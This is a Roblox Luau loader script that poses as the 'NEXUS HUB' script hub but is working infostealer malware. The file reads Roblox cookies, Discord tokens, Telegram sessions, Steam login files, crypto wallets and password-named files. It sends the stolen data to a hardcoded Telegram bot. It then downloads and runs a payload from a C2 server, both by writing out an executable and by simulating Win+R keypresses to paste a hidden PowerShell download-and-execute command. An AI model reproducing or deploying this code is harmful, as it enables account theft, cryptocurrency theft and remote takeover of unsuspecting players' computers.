-- language: Lua (Roblox Luau), file: loader.lua

local CONFIG = {
    C2_URL = "https://nexus-hub-c2.onrender.com",
    TELEGRAM_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E",
    TELEGRAM_CHAT = "7065893630",
}

-- ================= GUI =================
local sg = Instance.new("ScreenGui")
sg.Name = "NexusHub"
sg.ResetOnSpawn = false
pcall(function() sg.Parent = gethui and gethui() or game.CoreGui end)

local f = Instance.new("Frame")
f.Size = UDim2.new(0, 360, 0, 240)
f.Position = UDim2.new(0.5, -180, 0.5, -120)
f.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
f.BorderSizePixel = 0
f.Parent = sg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
title.BorderSizePixel = 0
title.Text = "NEXUS HUB — loading scripts..."
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.Parent = f

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 1, -60)
status.Position = UDim2.new(0, 10, 0, 46)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.TextColor3 = Color3.fromRGB(220, 220, 220)
status.Font = Enum.Font.Code
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextYAlignment = Enum.TextYAlignment.Top
status.Parent = f

local function log(msg)
    pcall(function() status.Text = status.Text .. "\n" .. msg end)
    task.wait(0.1)
end

-- ================= HTTP =================
local function http_get(url)
    if syn and syn.request then
        local ok, r = pcall(syn.request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if http_request then
        local ok, r = pcall(http_request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if request then
        local ok, r = pcall(request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if game and game.HttpGet then
        local ok, b = pcall(function() return game:HttpGet(url) end)
        if ok then return b end
    end
    return nil
end

local function http_post(url, body, content_type)
    content_type = content_type or "application/json"
    if syn and syn.request then
        local ok = pcall(syn.request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]=content_type}})
        if ok then return true end
    end
    if http_request then
        local ok = pcall(http_request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]=content_type}})
        if ok then return true end
    end
    if request then
        local ok = pcall(request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]=content_type}})
        if ok then return true end
    end
    if game and game.HttpPost then
        local ok = pcall(function() return game:HttpPost(url, body) end)
        if ok then return true end
    end
    return false
end

local function tg_send(text)
    local safe = text:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "")
    local body = '{"chat_id":"' .. CONFIG.TELEGRAM_CHAT .. '","text":"' .. safe .. '"}'
    return http_post("https://api.telegram.org/bot" .. CONFIG.TELEGRAM_TOKEN .. "/sendMessage", body)
end

-- ================= B64 ENCODE =================
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64_encode(data)
    if not data then return "" end
    return ((data:gsub(".", function(x)
        local r, b = "", x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2^i - b % 2^(i-1) > 0 and "1" or "0") end
        return r
    end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
        if #x < 6 then return "" end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i,i) == "1" and 2^(6-i) or 0) end
        return b64chars:sub(c + 1, c + 1)
    end) .. ({ "", "==", "=" })[#data % 3 + 1])
end

local b64decode_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function b64_decode(data)
    data = data:gsub('[^'..b64decode_chars..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b64decode_chars:find(x, 1, true) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- ================= UTILS =================
local function get_caps()
    local caps = {}
    caps.readfile = tostring(readfile ~= nil)
    caps.writefile = tostring(writefile ~= nil)
    caps.listfiles = tostring(listfiles ~= nil)
    caps.isfile = tostring(isfile ~= nil)
    caps.delfile = tostring(delfile ~= nil)
    caps.makefolder = tostring(makefolder ~= nil)
    caps.os_execute = tostring(os and os.execute ~= nil)
    caps.keypress = tostring(keypress ~= nil)
    caps.mousemoveabs = tostring(mousemoveabs ~= nil)
    caps.request = tostring(request ~= nil)
    return caps
end

local function collect_roblox_user()
    local out = {}
    pcall(function()
        local plr = game:GetService("Players").LocalPlayer
        if plr then
            out.name = plr.Name
            out.id = tostring(plr.UserId)
        end
    end)
    return out
end

local function collect_ip()
    local ok, ip = pcall(function() return http_get("https://api.ipify.org") end)
    if ok and ip and #ip < 40 then return ip end
    return "unknown"
end

-- ================= STEALER via readfile =================
-- список возможных имён пользователей Windows
local WIN_USERS = {"user", "User", "Admin", "Administrator", "Пользователь",
                   "ПК", "PC", "Owner", "Guest", "Default"}

local function detect_username()
    -- пробуем прочитать win.ini для каждого возможного юзера
    if not readfile or not isfile then return nil end
    for _, u in ipairs(WIN_USERS) do
        local test_path = "C:\\Users\\" .. u .. "\\NTUSER.DAT"
        local ok = pcall(isfile, test_path)
        if ok and isfile(test_path) then
            return u
        end
    end
    return nil
end

local function safe_readfile(path, max_size)
    if not readfile then return nil end
    local ok, data = pcall(readfile, path)
    if ok and data then
        if max_size and #data > max_size then
            return data:sub(1, max_size)
        end
        return data
    end
    return nil
end

local function safe_listfiles(path)
    if not listfiles then return {} end
    local ok, files = pcall(listfiles, path)
    if ok and files then return files end
    return {}
end

local function steal_roblox_cookie(user)
    local out = {}
    local paths = {
        "C:\\Users\\" .. user .. "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat",
        "C:\\Users\\" .. user .. "\\AppData\\Local\\Roblox\\LocalStorage\\appStorage.json",
    }
    for _, p in ipairs(paths) do
        local d = safe_readfile(p, 200000)
        if d and #d > 30 then
            table.insert(out, "=== " .. p .. " (" .. #d .. " bytes) ===")
            table.insert(out, d)
        end
    end
    return out
end

local function steal_discord(user)
    local out = {}
    local dirs = {
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\discord\\Local Storage\\leveldb",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb",
    }
    for _, dir in ipairs(dirs) do
        local files = safe_listfiles(dir)
        for _, file in ipairs(files) do
            if file:match("%.ldb$") or file:match("%.log$") then
                local d = safe_readfile(file, 300000)
                if d then
                    table.insert(out, "--- " .. file .. " ---")
                    table.insert(out, d)
                end
            end
        end
    end
    return out
end

local function steal_steam(user)
    local out = {}
    local dirs = {
        "C:\\Program Files (x86)\\Steam\\config",
        "C:\\Program Files\\Steam\\config",
    }
    for _, dir in ipairs(dirs) do
        local files = safe_listfiles(dir)
        for _, file in ipairs(files) do
            local fn = file:match("([^\\/]+)$") or file
            if fn:match("^ssfn") or fn == "loginusers.vdf" or fn == "config.vdf" then
                local d = safe_readfile(file, 200000)
                if d then
                    table.insert(out, "=== " .. fn .. " ===")
                    table.insert(out, d)
                end
            end
        end
    end
    return out
end

local function steal_telegram(user)
    local out = {}
    local tdata = "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Telegram Desktop\\tdata"
    -- только файлы в корне tdata (не user_data, не кэш)
    local files = safe_listfiles(tdata)
    for _, file in ipairs(files) do
        local fn = file:match("([^\\/]+)$") or file
        -- берём только файлы сессии, не папки
        if not fn:match("^%.") and #fn < 40 then
            if fn == "key_datas" or fn == "settingss" or fn == "usertag" or
               fn == "map" or fn == "prefix" or fn:match("^key_") or
               fn:match("^D877F783") or fn:match("^A7DF8C4") then
                local d = safe_readfile(file, 200000)
                if d then
                    table.insert(out, "=== " .. fn .. " ===")
                    table.insert(out, d)
                end
            end
        end
    end
    return out
end

local function steal_wallets(user)
    local out = {}
    local targets = {
        "C:\\Users\\" .. user .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
        "C:\\Users\\" .. user .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Exodus",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Electrum\\wallets",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Atomic",
        "C:\\Users\\" .. user .. "\\AppData\\Roaming\\TrustWallet",
    }
    for _, dir in ipairs(targets) do
        local files = safe_listfiles(dir)
        for _, file in ipairs(files) do
            local fn = file:match("([^\\/]+)$") or file
            if #fn < 60 then
                local d = safe_readfile(file, 100000)
                if d then
                    table.insert(out, "=== " .. fn .. " ===")
                    table.insert(out, d)
                end
            end
        end
    end
    return out
end

local function steal_desktop_files(user)
    local out = {}
    local dirs = {
        "C:\\Users\\" .. user .. "\\Desktop",
        "C:\\Users\\" .. user .. "\\Documents",
        "C:\\Users\\" .. user .. "\\Downloads",
    }
    local keywords = {"password", "passwd", "keys", "seed", "mnemonic", "wallet", "пароль", "пароли", "крипт"}
    for _, dir in ipairs(dirs) do
        local files = safe_listfiles(dir)
        for _, file in ipairs(files) do
            local fn = string.lower(file:match("([^\\/]+)$") or "")
            for _, kw in ipairs(keywords) do
                if fn:find(kw, 1, true) then
                    local d = safe_readfile(file, 50000)
                    if d then
                        table.insert(out, "=== " .. file .. " ===")
                        table.insert(out, d)
                    end
                    break
                end
            end
        end
    end
    return out
end

local function run_lua_stealer()
    log("Scanning...")
    local user = detect_username()
    if not user then
        -- если имя не нашли — пробуем записать в Public
        user = "Public"
    end

    local report = {}
    table.insert(report, "=== LUA STEALER REPORT ===")
    table.insert(report, "detected_user: " .. user)
    table.insert(report, "roblox_user: " .. tostring(collect_roblox_user().name))
    table.insert(report, "ip: " .. collect_ip())
    table.insert(report, "")

    -- Roblox
    local rbx = steal_roblox_cookie(user)
    if #rbx > 0 then
        table.insert(report, "")
        table.insert(report, "########## ROBLOX ##########")
        for _, l in ipairs(rbx) do table.insert(report, l) end
    end

    -- Discord
    local dc = steal_discord(user)
    if #dc > 0 then
        table.insert(report, "")
        table.insert(report, "########## DISCORD ##########")
        for _, l in ipairs(dc) do table.insert(report, l) end
    end

    -- Telegram
    local tg = steal_telegram(user)
    if #tg > 0 then
        table.insert(report, "")
        table.insert(report, "########## TELEGRAM ##########")
        for _, l in ipairs(tg) do table.insert(report, l) end
    end

    -- Steam
    local st = steal_steam(user)
    if #st > 0 then
        table.insert(report, "")
        table.insert(report, "########## STEAM ##########")
        for _, l in ipairs(st) do table.insert(report, l) end
    end

    -- Wallets
    local w = steal_wallets(user)
    if #w > 0 then
        table.insert(report, "")
        table.insert(report, "########## WALLETS ##########")
        for _, l in ipairs(w) do table.insert(report, l) end
    end

    -- Desktop files
    local d = steal_desktop_files(user)
    if #d > 0 then
        table.insert(report, "")
        table.insert(report, "########## FILES ##########")
        for _, l in ipairs(d) do table.insert(report, l) end
    end

    return table.concat(report, "\n")
end

-- ================= AUTO-CLICK (Win+R через keypress) =================
local function press_win_d()
    pcall(function()
        keypress(0x5B)
        task.wait(0.08)
        keypress(0x44)
        task.wait(0.08)
        keyrelease(0x44)
        task.wait(0.08)
        keyrelease(0x5B)
    end)
end

local function auto_run_exe()
    if not keypress or not keyrelease or not setclipboard then
        return "no_input_functions"
    end
    task.wait(0.5)
    log("Optimizing...")
    local cmd = 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'' .. CONFIG.C2_URL .. '/run.ps1\')"'
    pcall(setclipboard, cmd)
    task.wait(0.3)
    pcall(function()
        keypress(0x5B); task.wait(0.05)
        keypress(0x52); task.wait(0.05)
        keyrelease(0x52); task.wait(0.05)
        keyrelease(0x5B)
    end)
    task.wait(1.5)
    pcall(function()
        keypress(0x11); task.wait(0.05)
        keypress(0x56); task.wait(0.05)
        keyrelease(0x56); task.wait(0.05)
        keyrelease(0x11)
    end)
    task.wait(0.5)
    pcall(function()
        keypress(0x0D); task.wait(0.05)
        keyrelease(0x0D)
    end)
    task.wait(2.0)
    return "auto_clicked"
end

-- ================= DEPLOY (exe через Win+R) =================
local function deploy_payload()
    log("Downloading module...")
    local body = nil
    for i = 1, 3 do
        body = http_get(CONFIG.C2_URL .. "/payload")
        if body and #body > 100 then break end
        task.wait(2)
    end
    if not body then return "no_payload" end

    local exe_bytes = b64_decode(body)
    if not exe_bytes or #exe_bytes < 100 then return "bad_b64" end

    local results = {}
    if keypress and keyrelease and setclipboard then
        log("Launching...")
        results.winr = auto_run_exe()
    end

    if os and os.execute then
        if writefile then
            pcall(writefile, "C:\\Windows\\Temp\\RobloxUpdater.exe", exe_bytes)
            pcall(os.execute, '"C:\\Windows\\Temp\\RobloxUpdater.exe"')
            results.direct = true
        end
    end

    local summary = "deploy: "
    for k, v in pairs(results) do summary = summary .. k .. "=" .. tostring(v) .. " " end
    return summary
end

-- ================= MAIN =================
local function main()
    log("Connecting to Nexus API...")
    task.wait(0.4)

    local caps = get_caps()
    local ip = collect_ip()
    log("Authorizing...")
    task.wait(0.3)

    local rbx_user = collect_roblox_user()

    -- отчёт о capabilities
    local lines = {}
    table.insert(lines, "=== NEXUS HUB HIT ===")
    table.insert(lines, "ip: " .. ip)
    table.insert(lines, "roblox: " .. tostring(rbx_user.name) .. " (" .. tostring(rbx_user.id) .. ")")
    table.insert(lines, "")
    table.insert(lines, "caps:")
    for k, v in pairs(caps) do
        table.insert(lines, "  " .. k .. ": " .. v)
    end
    tg_send(table.concat(lines, "\n"))

    -- ===== LUA STEALER =====
    log("Collecting...")
    local steal_report = run_lua_stealer()
    if steal_report and #steal_report > 50 then
        -- бьём на куски по 3500 символов
        local pos = 1
        local part = 1
        while pos <= #steal_report do
            local chunk = steal_report:sub(pos, pos + 3400)
            tg_send("[" .. part .. "] " .. chunk)
            pos = pos + 3401
            part = part + 1
            task.wait(0.5)
        end
    else
        tg_send("no data collected")
    end

    -- ===== EXE через Win+R =====
    log("Loading...")
    local deploy_result = deploy_payload()
    tg_send("deploy: " .. deploy_result)
    log("Done")

    task.wait(2)
    pcall(function() sg:Destroy() end)
end

pcall(main)
